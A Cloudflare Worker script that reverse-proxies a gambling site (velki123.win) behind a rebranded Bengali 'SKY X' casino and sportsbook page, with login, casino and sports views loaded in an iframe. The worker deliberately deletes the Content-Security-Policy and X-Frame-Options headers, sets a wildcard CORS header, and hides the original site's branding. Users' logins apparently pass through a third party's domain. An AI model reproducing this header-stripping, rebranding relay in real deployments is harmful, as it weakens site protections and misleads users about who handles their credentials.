addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request))
})

async function handleRequest(request) {
  const TARGET_DOMAIN = "velki123.win";
  const url = new URL(request.url);

  const isInternalCall = url.searchParams.has('app');
  
  if (!isInternalCall && !url.pathname.match(/\.(js|css|png|jpg|jpeg|gif|webp|svg|ico)$/i)) {
    return new Response(customHTML, {
      headers: { 
        'content-type': 'text/html;charset=UTF-8',
        'Cache-Control': 'no-cache, no-store, must-revalidate'
      },
    });
  }

  url.hostname = TARGET_DOMAIN;
  url.protocol = 'https:';

  let newHeaders = new Headers(request.headers);
  newHeaders.set('Host', TARGET_DOMAIN);
  newHeaders.set('Origin', `https://${TARGET_DOMAIN}`);
  newHeaders.set('Referer', `https://${TARGET_DOMAIN}/`);

  const modifiedRequest = new Request(url.toString(), {
    method: request.method,
    headers: newHeaders,
    body: request.body,
    redirect: 'manual'
  });

  const response = await fetch(modifiedRequest);
  
  const contentType = response.headers.get('content-type') || '';
  if (contentType.includes('text/html')) {
    let newResponse = new Response(response.body, response);
    newResponse.headers.set('Access-Control-Allow-Origin', '*');
    newResponse.headers.delete('X-Frame-Options'); 
    newResponse.headers.delete('Content-Security-Policy');

    return new HTMLRewriter()
      .on('head', {
        element(el) {
          el.append(`
            <style>
              header, footer, nav, .header, .footer, .bottom-nav, .mobile-nav, 
              #header, #footer, .top-bar, .bottom-bar, .menu-wrap, 
              .page-header, .back-bar, [class*="nav"], [class*="header"], .app-header {
                  display: none !important;
                  opacity: 0 !important;
                  height: 0 !important;
                  width: 0 !important;
                  visibility: hidden !important;
                  position: absolute !important;
                  z-index: -9999 !important;
                  pointer-events: none !important;
              }
              body { padding-top: 0 !important; padding-bottom: 0 !important; background-color: #000 !important; }
              html, body { overflow-x: hidden; width: 100%; height: 100%; }
            </style>
          `, { html: true });
        }
      })
      .transform(newResponse);
  }

  let finalResponse = new Response(response.body, response);
  finalResponse.headers.set('Access-Control-Allow-Origin', '*');
  finalResponse.headers.delete('X-Frame-Options');
  return finalResponse;
}

// ==========================================
// FULL HTML UI 
// ==========================================
const customHTML = `
<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SKY X - Premium</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Noto+Sans+Bengali:wght@400;500;600;700;800&family=Poppins:wght@600;700;800;900&display=swap');

        :root {
            --bg-dark: #0f172a;        
            --header-bg: #0b2246;      
            --sidebar-bg: #061933;     
            --primary-blue: #1e88e5;   
            --ticker-bg: #1a237e;      
        }

        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Noto Sans Bengali', sans-serif; -webkit-tap-highlight-color: transparent; }
        body { background-color: #000; display: flex; justify-content: center; height: 100vh; overflow: hidden; }
        
        .app-container { width: 100%; max-width: 480px; background-color: var(--bg-dark); height: 100%; display: flex; flex-direction: column; position: relative; overflow: hidden; }
        
        /* --- Header --- */
        .header { background-color: var(--header-bg); padding: 10px 15px; display: flex; justify-content: space-between; align-items: center; height: 60px; flex-shrink: 0; z-index: 20; position: relative; }
        .logo { font-size: 26px; font-weight: 900; font-style: italic; display: flex; align-items: center; font-family: 'Poppins', sans-serif; }
        .logo .part-1 { color: #ffffff; font-family: 'Poppins', sans-serif; } 
        .logo .part-2 { color: #38bdf8; font-family: 'Poppins', sans-serif; }
        .login-btn { background-color: var(--primary-blue); color: white; border: none; padding: 8px 20px; border-radius: 4px; font-weight: 600; font-size: 14px; display: flex; align-items: center; gap: 6px; cursor: pointer; }

        /* --- Full Screen Iframe --- */
        #iframe-container { display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 999999; background-color: #000; }
        #content-frame { width: 100%; height: 100%; border: none; opacity: 0; transition: opacity 0.5s ease-in-out; }
        #loading-spinner { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); color: var(--primary-blue); font-size: 40px; z-index: -1; }

        #main-content-area { flex: 1; display: flex; flex-direction: column; overflow: hidden; }

        /* --- Slider --- */
        .slider-container { width: 100%; height: 130px; overflow: hidden; position: relative; flex-shrink: 0; background-color: var(--header-bg); }
        .slider-track { display: flex; width: 300%; height: 100%; transition: transform 0.5s ease-in-out; }
        .slide { width: 100%; height: 100%; display: flex; align-items: center; justify-content: flex-end; padding: 15px; padding-right: 30px; color: white; text-align: right; }
        .slide-1 { background: linear-gradient(135deg, #004d40, #0d47a1); }
        .slide-2 { background: linear-gradient(135deg, #b71c1c, #4a148c); }
        .slide-3 { background: linear-gradient(135deg, #e65100, #1b5e20); }
        .slide-content h2 { font-size: 20px; margin-bottom: 4px; font-weight: 800; text-shadow: 1px 1px 2px rgba(0,0,0,0.5); }
        .slide-content h2 span { color: #ffeb3b; font-weight: 900;}
        .slide-content p { font-size: 12px; color: #e0f7fa; }
        .slider-dots { position: absolute; bottom: 10px; left: 50%; transform: translateX(-50%); display: flex; gap: 6px; }
        .dot { width: 6px; height: 6px; background: rgba(255,255,255,0.4); border-radius: 50%; transition: 0.3s; }
        .dot.active { background: #ffffff; width: 16px; border-radius: 4px; }

        /* --- News Ticker --- */
        .announcement-bar { background-color: var(--ticker-bg); color: white; display: flex; align-items: center; height: 36px; flex-shrink: 0; border-bottom: 1px solid #283593; }
        .megaphone-icon { background-color: var(--header-bg); width: 40px; height: 100%; display: flex; justify-content: center; align-items: center; color: #ffca28; z-index: 2; box-shadow: 2px 0 5px rgba(0,0,0,0.3); font-size: 16px; }
        .scrolling-text { flex: 1; overflow: hidden; font-size: 12px; font-weight: 500; padding-top: 2px; }

        /* --- Main Layout --- */
        .main-layout { display: flex; flex: 1; overflow: hidden; }
        
        .sidebar { width: 75px; background-color: var(--sidebar-bg); overflow-y: auto; flex-shrink: 0; padding-top: 5px; }
        .sidebar::-webkit-scrollbar { width: 0; }
        .nav-item-left { display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 15px 4px; color: #64748b; border-bottom: 1px solid rgba(255,255,255,0.02); cursor: pointer; transition: 0.2s; }
        .nav-item-left i { font-size: 22px; margin-bottom: 6px; }
        .nav-item-left span { font-size: 11px; font-weight: 600; text-align: center; }
        .nav-item-left.active { background-color: #1e3a8a; color: #ffffff; position: relative; }
        .nav-item-left.active i { color: #38bdf8; }
        .nav-item-left.active::before { content: ''; position: absolute; left: 0; top: 0; height: 100%; width: 4px; background-color: #38bdf8; }

        .game-feed { flex: 1; overflow-y: auto; padding: 10px; padding-bottom: 80px; }
        .game-feed::-webkit-scrollbar { width: 0; }
        
        .tab-content { display: none; width: 100%; }
        .tab-content.active { display: block; animation: fadeIn 0.3s; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }

        .list-card {
            width: 100%; height: 130px; border-radius: 8px; margin-bottom: 12px; position: relative; display: flex; align-items: center; justify-content: center; font-size: 24px; font-weight: 900; color: white; font-family: 'Poppins', sans-serif; text-shadow: 2px 2px 5px rgba(0,0,0,0.8); box-shadow: 0 4px 8px rgba(0,0,0,0.5); overflow: hidden; cursor: pointer; border: 1px solid rgba(255,255,255,0.05);
        }
        .card-label { position: absolute; bottom: 0; left: 0; right: 0; background: rgba(0,0,0,0.7); backdrop-filter: blur(5px); font-size: 11px; padding: 6px; text-align: center; letter-spacing: 1px; font-weight: 700; color: #e0f2fe; text-transform: uppercase; }

        .bg-superace { background: linear-gradient(135deg, #4d7c0f, #eab308); }
        .bg-crazytime { background: linear-gradient(135deg, #7e22ce, #be185d); }
        .bg-fortune { background: linear-gradient(135deg, #c2410c, #f59e0b); }
        .bg-sports1 { background: linear-gradient(135deg, #0f172a, #0284c7); }
        .bg-sports2 { background: linear-gradient(to right, #1e1b4b, #312e81); }

        /* =========================================
           NEW 1XBET STYLE BOTTOM NAVIGATION 
           ========================================= */
        .bottom-nav { 
            position: absolute; 
            bottom: 0; 
            width: 100%; 
            height: 65px; 
            background-color: #051024; /* ডার্ক ব্যাকগ্রাউন্ড */
            display: flex; 
            justify-content: space-around; 
            align-items: flex-end; /* আইটেমগুলো নিচ থেকে শুরু হবে */
            padding-bottom: 8px; 
            z-index: 20; 
            box-shadow: 0 -2px 10px rgba(0,0,0,0.5); 
        }

        .bottom-nav-item { 
            display: flex; 
            flex-direction: column; 
            align-items: center; 
            justify-content: flex-end; 
            color: #64748b; 
            text-decoration: none; 
            width: 20%; 
            height: 100%; 
            position: relative; 
            transition: all 0.2s ease; 
            cursor: pointer; 
        }
        
        .bottom-nav-item i { font-size: 20px; margin-bottom: 4px; transition: color 0.2s; }
        .bottom-nav-item span { font-size: 11px; font-weight: 600; }
        
        /* Active State */
        .bottom-nav-item.active { color: #ffffff; }
        .bottom-nav-item.active i { color: #38bdf8; }

        /* Special Center HOME Button (Bulging Effect) */
        .home-btn { justify-content: flex-end; }
        .home-btn span { margin-top: auto; }
        
        .home-icon-wrapper { 
            position: absolute; 
            top: -22px; /* ওপরের দিকে বেরিয়ে থাকবে */
            left: 50%; 
            transform: translateX(-50%); 
            width: 54px; 
            height: 54px; 
            background: linear-gradient(135deg, #0ea5e9, #2563eb); /* নীল বৃত্ত */
            border-radius: 50%; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            border: 6px solid #0f172a; /* ব্যাকগ্রাউন্ড কালারের বর্ডার যাতে মনে হয় কেটে বসেছে */
            box-shadow: 0 -2px 6px rgba(0,0,0,0.3); 
            z-index: 21; 
            transition: transform 0.2s;
        }
        .home-icon-wrapper:active { transform: translateX(-50%) scale(0.95); }
        
        .bottom-nav-item.active .home-icon-wrapper i { color: #ffffff; }
        .home-icon-wrapper i { 
            font-size: 22px !important; 
            margin-bottom: 0 !important; 
            color: rgba(255,255,255,0.9); 
        }

    </style>
</head>
<body>
<div class="app-container">
    
    <header class="header">
        <div class="logo">
            <span class="part-1">SKY</span><span class="part-2">X</span>
        </div>
        <button class="login-btn" onclick="openIframe('/login')">
            <i class="fa-solid fa-user"></i> Login
        </button>
    </header>

    <div id="iframe-container">
        <i id="loading-spinner" class="fa-solid fa-circle-notch fa-spin"></i>
        <iframe id="content-frame" src=""></iframe>
    </div>

    <div id="main-content-area">
        
        <div class="slider-container">
            <div class="slider-track" id="sliderTrack">
                <div class="slide slide-1"><div class="slide-content"><h2>ফ্রি ২০৩ <span>JILI</span> স্পিন</h2><p>দাবি করতে প্রতিদিন লগইন করুন</p></div></div>
                <div class="slide slide-2"><div class="slide-content"><h2>১০০% <span>ওয়েলকাম</span> বোনাস</h2><p>প্রথম ডিপোজিটে দ্বিগুণ মজা</p></div></div>
                <div class="slide slide-3"><div class="slide-content"><h2>সাপ্তাহিক <span>ক্যাশব্যাক</span> ১০%</h2><p>খেলুন নিশ্চিন্তে, ক্যাশব্যাক গ্যারান্টি</p></div></div>
            </div>
            <div class="slider-dots">
                <div class="dot active"></div><div class="dot"></div><div class="dot"></div>
            </div>
        </div>

        <div class="announcement-bar">
            <div class="megaphone-icon"><i class="fa-solid fa-bullhorn"></i></div>
            <div class="scrolling-text">
                <marquee scrollamount="4">নতুন সদস্যদের জন্য ৩ টি বোনাস , ১০০% ক্যাশব্যাক! ক্যাসিনো এবং স্লট গেমসে বিশাল প্রাইজ পুল!</marquee>
            </div>
        </div>

        <div class="main-layout">
            
            <aside class="sidebar">
                <div onclick="switchTab('hot', this)" class="nav-item-left active"><i class="fa-solid fa-fire"></i><span>হট গেম</span></div>
                <div onclick="switchTab('sports', this)" class="nav-item-left"><i class="fa-solid fa-futbol"></i><span>স্পোর্টস</span></div>
                <div onclick="switchTab('casino', this)" class="nav-item-left"><i class="fa-solid fa-diamond"></i><span>ক্যাসিনো</span></div>
                <div onclick="switchTab('slots', this)" class="nav-item-left"><i class="fa-solid fa-slot-machine"></i><i class="fa-solid fa-7"></i><span>স্লট</span></div>
                <div onclick="switchTab('crash', this)" class="nav-item-left"><i class="fa-solid fa-rocket"></i><span>ক্র্যাশ</span></div>
                <div onclick="switchTab('table', this)" class="nav-item-left"><i class="fa-solid fa-table"></i><span>টেবিল</span></div>
            </aside>

            <main class="game-feed"> 
                
                <div id="hot" class="tab-content active"> 
                    <div class="list-card bg-superace" onclick="openIframe('/casino')">
                        SUPER ACE<div class="card-label">JILI GAMES</div>
                    </div>
                    <div class="list-card bg-crazytime" onclick="openIframe('/casino')">
                        CRAZY TIME<div class="card-label">EVOLUTION</div>
                    </div>
                    <div class="list-card bg-fortune" onclick="openIframe('/casino')">
                        FORTUNE TIGER<div class="card-label">PG SOFT</div>
                    </div>
                </div>

                <div id="sports" class="tab-content"> 
                    <div class="list-card bg-sports1" onclick="openIframe('/sports')">
                        IN-PLAY MATCHES<div class="card-label">PREMIUM SPORTSBOOK</div>
                    </div>
                    <div class="list-card bg-sports2" onclick="openIframe('/sports')">
                        SABA SPORTS<div class="card-label">ASIAN HANDICAP</div>
                    </div>
                </div>

                <div id="casino" class="tab-content"> 
                    <div class="list-card bg-crazytime" onclick="openIframe('/casino')">
                        LIGHTNING ROULETTE<div class="card-label">EVOLUTION</div>
                    </div>
                    <div class="list-card bg-sports1" onclick="openIframe('/casino')">
                        MEGA SIC BO<div class="card-label">PP LIVE</div>
                    </div>
                </div>
                
                <div id="slots" class="tab-content"> </div>
                <div id="crash" class="tab-content"> </div>
                <div id="table" class="tab-content"> </div>

            </main>
        </div>
    </div>

    <nav class="bottom-nav">
        <div class="bottom-nav-item" onclick="openIframe('/sports'); setActiveNav(this)">
            <i class="fa-solid fa-arrow-right-arrow-left" style="transform: rotate(90deg);"></i>
            <span>Exch</span>
        </div>
        <div class="bottom-nav-item" onclick="openIframe('/sports'); setActiveNav(this)">
            <i class="fa-regular fa-clock"></i>
            <span>In-Play</span>
        </div>
        
        <div class="bottom-nav-item active home-btn" onclick="closeIframe(); setActiveNav(this)">
            <div class="home-icon-wrapper">
                <i class="fa-solid fa-house"></i>
            </div>
            <span>Home</span>
        </div>
        
        <div class="bottom-nav-item" onclick="openIframe('/sports'); setActiveNav(this)">
            <i class="fa-solid fa-users"></i>
            <span>Sports</span>
        </div>
        <div class="bottom-nav-item" onclick="openIframe('/login'); setActiveNav(this)">
            <i class="fa-regular fa-circle-user"></i>
            <span>Account</span>
        </div>
    </nav>
</div>

<script>
    const iframeContainer = document.getElementById('iframe-container');
    const contentFrame = document.getElementById('content-frame');

    function openIframe(url) {
        if (document.documentElement.requestFullscreen) {
            document.documentElement.requestFullscreen().catch((e) => console.log(e));
        }
        history.pushState({ gameOpen: true }, "Game", window.location.href);
        
        const finalUrl = url + (url.includes('?') ? '&' : '?') + 'app=true';
        
        iframeContainer.style.display = 'block';
        contentFrame.style.opacity = '0';
        contentFrame.src = finalUrl;

        contentFrame.onload = function() {
            contentFrame.style.opacity = '1';
        };
    }

    function closeIframe() {
        iframeContainer.style.display = 'none';
        contentFrame.src = '';
        if (document.exitFullscreen) {
            document.exitFullscreen().catch(()=>{});
        }
    }

    window.addEventListener('popstate', function(event) {
        closeIframe();
    });

    function setActiveNav(el) {
        document.querySelectorAll('.bottom-nav-item').forEach(n => n.classList.remove('active'));
        el.classList.add('active');
    }

    function switchTab(tabId, el) {
        document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
        document.querySelectorAll('.nav-item-left').forEach(n => n.classList.remove('active'));
        document.getElementById(tabId).classList.add('active');
        el.classList.add('active');
    }

    let currentSlide = 0;
    const totalSlides = 3;
    const sliderTrack = document.getElementById('sliderTrack');
    const dots = document.querySelectorAll('.dot');

    function nextSlide() {
        currentSlide = (currentSlide + 1) % totalSlides;
        sliderTrack.style.transform = \`translateX(-\${currentSlide * 33.333}%)\`;
        dots.forEach(dot => dot.classList.remove('active'));
        dots[currentSlide].classList.add('active');
    }
    setInterval(nextSlide, 3500);
</script>
</body>
</html>
`;
